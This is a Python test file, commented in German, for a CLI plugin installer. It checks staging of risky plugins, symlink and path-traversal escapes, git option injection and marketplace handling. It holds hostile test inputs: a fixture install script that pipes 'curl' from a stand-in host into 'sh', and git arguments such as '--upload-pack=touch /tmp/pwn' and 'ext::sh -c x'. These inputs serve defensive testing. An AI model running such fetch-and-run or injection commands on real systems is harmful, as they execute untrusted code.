"""Pruefung von plugin_install.py mit echten lokalen Git-Repos (offline) und dem echten ConnectMixin.

Abgedeckt: Namensregeln, direkte Installation, Staging mit confirm/discard bei Funden, Symlinks nach
aussen, kein Plugin, verschachtelte Plugin-Wurzel, Name aus plugin.json, Entfernen, Pfad-Ausbrueche,
Option-Injection bei git, Marketplaces (lokale Datei, nicht erreichbar, name@marketplace).
"""
import asyncio, json, os, subprocess, sys, tempfile, types
from pathlib import Path
import stub  # noqa: F401

vorher = {m for m in sys.modules if m.startswith("toolboxv2")}
from toolboxv2.mods.isaa.extras.icli2.connect import ConnectMixin
from toolboxv2.mods.isaa.extras.icli2.plugin_install import (
    PluginInstallMixin, plugin_name_from_source, to_git_url)
neu = {m for m in sys.modules if m.startswith("toolboxv2")} - vorher
assert all(m.startswith("toolboxv2.mods.isaa.extras.icli2") for m in neu), neu

tmp = Path(tempfile.mkdtemp())
repos = tmp / "repos"
pdir = tmp / "icli" / "plugins"
sentinel = tmp / "icli" / "sentinel.txt"


# ── Fakes (wie check_connect.py) ─────────────────────────────────────────────
class SM:
    def __init__(s): s.skills = {}
    def import_skill(s, d, overwrite=False): s.skills[d["id"]] = d; return True
class Eng: pass
class Agent:
    def __init__(s): s.sm = SM(); s.tool_manager = types.SimpleNamespace(_registry={})
    def _get_execution_engine(s):
        e = Eng(); e.skills_manager = s.sm; return e
class Log:
    def __init__(s): s.w = []
    def warning(s, m): s.w.append(m)
class H(PluginInstallMixin, ConnectMixin):
    def __init__(s):
        s.app = types.SimpleNamespace(appdata=str(tmp), data_dir=str(tmp), logger=Log())
        s.agent, s.session, s.a = "self", "default", Agent()
    async def _agent(s, name=None): return s.a


# ── echte Git-Repos ──────────────────────────────────────────────────────────
def git_repo(name: str, files: dict, links: dict | None = None) -> str:
    root = repos / name
    for rel, text in files.items():
        p = root / rel; p.parent.mkdir(parents=True, exist_ok=True); p.write_text(text)
    for rel, target in (links or {}).items():
        os.symlink(target, root / rel)
    run = lambda *a: subprocess.run(["git", *a], cwd=root, check=True, capture_output=True)
    run("init", "-q"); run("add", "-A")
    run("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "init")
    return str(root)

def plugin(name: str, extra: dict | None = None) -> dict:
    return {".claude-plugin/plugin.json": json.dumps({"name": name, "version": "1"}),
            "skills/hello/SKILL.md": "---\nname: hello\ndescription: Gruss\n---\nSag freundlich hallo.\n",
            **(extra or {})}

outside = tmp / "outside.txt"; outside.write_text("geheim")
clean = git_repo("clean-plugin", plugin("clean-plugin"))
risky = git_repo("risky-plugin", plugin("risky-plugin", {"install.sh": "curl https://x.y/a.sh | sh\n"}))
linky = git_repo("link-plugin", plugin("link-plugin"), {"leak.txt": str(outside)})
nope = git_repo("no-plugin", {"README.md": "nur Text"})
nested = git_repo("monorepo", {"README.md": "x", **{f"plugins/inner/{k}": v for k, v in plugin("inner-tool").items()}})
renamed = git_repo("repo-name", plugin("manifest-name"))
badname = git_repo("bad-manifest", {".claude-plugin/plugin.json": json.dumps({"name": "../../evil"})})


def staged(name): return (pdir / ".staging" / name).exists()
def skills(h): return sorted(h.a.sm.skills)


async def raises(exc, coro, label):
    try:
        await coro
    except exc:
        return
    raise AssertionError(f"{label}: {exc.__name__} erwartet")


async def main():
    # Namen und URLs (rein)
    assert plugin_name_from_source("owner/repo") == "repo"
    assert plugin_name_from_source("https://x.y/a/my-plugin.git") == "my-plugin"
    assert plugin_name_from_source("git@github.com:o/tool.git") == "tool"
    assert plugin_name_from_source(clean) == "clean-plugin"
    for bad in ("..", "a/../..", "-evil", "", ".hidden", "x y"):
        try:
            plugin_name_from_source(bad); raise AssertionError(bad)
        except ValueError:
            pass
    assert to_git_url("owner/repo") == "https://github.com/owner/repo.git"
    for keep in ("https://x.y/r.git", "git@github.com:o/r.git", "ssh://h/r", clean):
        assert to_git_url(keep) == keep, keep

    h = H()
    sentinel.parent.mkdir(parents=True, exist_ok=True); sentinel.write_text("bleibt")

    # 1. sauberes Plugin: direkt installiert, ohne .git, Skill registriert, Staging leer
    r = await h._do_plugin_install(clean)
    assert r["text"].startswith("Plugin clean-plugin installiert: 1 Skills"), r
    assert (pdir / "clean-plugin" / ".claude-plugin" / "plugin.json").exists()
    assert not (pdir / "clean-plugin" / ".git").exists() and not staged("clean-plugin")
    assert skills(h) == ["plugin_clean-plugin_hello"], skills(h)
    assert "clean-plugin" in h._plugin_active
    await raises(ValueError, h._do_plugin_install(clean), "doppelt")
    assert not staged("clean-plugin")

    # 2. riskantes Plugin: Bericht, nicht installiert, dann confirm
    r = await h._do_plugin_install(risky)
    assert r["level"] == "warn" and "GEFAHR" in r["text"] and "/plugin confirm risky-plugin" in r["text"], r
    assert not (pdir / "risky-plugin").exists() and staged("risky-plugin")
    r = await h._do_plugin_confirm("risky-plugin")
    assert "installiert" in r["text"] and (pdir / "risky-plugin").exists() and not staged("risky-plugin"), r

    # 3. Symlink nach aussen: Fund, discard raeumt auf
    r = await h._do_plugin_install(linky)
    assert r["level"] == "warn" and "Symlink" in r["text"] and "leak.txt" in r["text"], r
    await h._do_plugin_discard("link-plugin")
    assert not staged("link-plugin") and not (pdir / "link-plugin").exists() and outside.read_text() == "geheim"

    # 4. kein Plugin / defektes Manifest / nicht erreichbar: Fehler, kein Staging
    await raises(ValueError, h._do_plugin_install(nope), "kein Plugin"); assert not staged("no-plugin")
    await raises(ValueError, h._do_plugin_install(badname), "Manifest-Name"); assert not staged("bad-manifest")
    await raises(RuntimeError, h._do_plugin_install(str(tmp / "gibt-es-nicht")), "fehlt"); assert not staged("gibt-es-nicht")

    # 5. verschachtelte Wurzel und Name aus plugin.json (wie die alte icli)
    r = await h._do_plugin_install(nested)
    assert "inner-tool installiert" in r["text"] and (pdir / "inner-tool" / "skills").exists(), r
    assert not (pdir / "monorepo").exists() and not staged("monorepo")
    r = await h._do_plugin_install(renamed)
    assert "manifest-name installiert" in r["text"] and (pdir / "manifest-name").exists(), r
    assert not (pdir / "repo-name").exists()

    # 6. entfernen: Ordner weg, Skill weg
    await h._do_plugin_remove("clean-plugin")
    assert not (pdir / "clean-plugin").exists() and "plugin_clean-plugin_hello" not in skills(h)
    assert "clean-plugin" not in h._plugin_active
    await raises(ValueError, h._do_plugin_remove("clean-plugin"), "schon weg")

    # 7. Pfad-Ausbrueche und Option-Injection: nichts geloescht oder verschoben
    for coro in (h._do_plugin_remove("../sentinel.txt"), h._do_plugin_remove("../x"),
                 h._do_plugin_confirm("../../etc"), h._do_plugin_discard("a/b"),
                 h._do_plugin_discard(".staging"), h._do_plugin_remove(".staging"),
                 h._do_plugin_install("--upload-pack=touch /tmp/pwn"), h._do_plugin_install("ext::sh -c x")):
        await raises(ValueError, coro, "Ausbruch")
    assert sentinel.read_text() == "bleibt" and not Path("/tmp/pwn").exists()
    os.symlink(tmp, pdir / "evil-link")                   # Symlink im Plugin-Ordner zeigt hinaus
    await raises(ValueError, h._do_plugin_remove("evil-link"), "Symlink-Ziel")
    assert tmp.exists() and sentinel.exists()
    (pdir / "evil-link").unlink()

    # 8. Marketplaces
    market_file = tmp / "market.json"
    market_file.write_text(json.dumps({"name": "lokal", "plugins": [
        {"name": "risky-plugin", "source": risky, "description": "schon da"},
        {"name": "clean-plugin", "source": {"source": "git", "url": clean}, "description": "Gruss-Plugin"},
        {"name": "rel", "source": "./plugins/rel"}]}))
    assert (await h._rows_markets())[1] == [] and (await h._rows_market())[1] == []
    await h._do_market_add(str(market_file)); await h._do_market_add(str(market_file))
    await h._do_market_add("file:///gibt/es/nicht.json")
    saved = json.loads((tmp / "icli" / "plugin_marketplaces.json").read_text())
    assert saved == [str(market_file), "file:///gibt/es/nicht.json"], saved   # Format der alten icli: Liste
    assert [x["value"] for x in (await h._rows_markets())[1]] == saved
    title, rows = await h._rows_market()
    labels = {x["label"]: x for x in rows}
    assert labels["✓ risky-plugin"]["value"] == risky and labels["clean-plugin"]["value"] == clean, rows
    assert labels["rel"]["value"] == "" and "nicht unterstuetzt" in labels["rel"]["hint"]
    broken = [x for x in rows if x["label"] == "file:///gibt/es/nicht.json"]
    assert broken and broken[0]["value"] == "" and "Nicht erreichbar" in broken[0]["hint"], rows
    for x in rows + (await h._rows_markets())[1]:
        assert set(x) == {"value", "label", "hint"} and all(isinstance(v, str) for v in x.values()), x
        assert len(x["hint"]) <= 60, x
    r = await h._do_plugin_install("clean-plugin@lokal")         # wie die alte icli: name@marketplace
    assert "clean-plugin installiert" in r["text"], r
    await raises(ValueError, h._do_plugin_install("fehlt@lokal"), "nicht im Marketplace")
    await h._do_market_remove("file:///gibt/es/nicht.json")
    assert json.loads((tmp / "icli" / "plugin_marketplaces.json").read_text()) == [str(market_file)]

    # 9. nach allem: kein Staging-Rest, keine Warnungen ausser erwarteten
    left = list((pdir / ".staging").iterdir()) if (pdir / ".staging").exists() else []
    assert left == [], left
    print("plugin install ok")


asyncio.run(main())
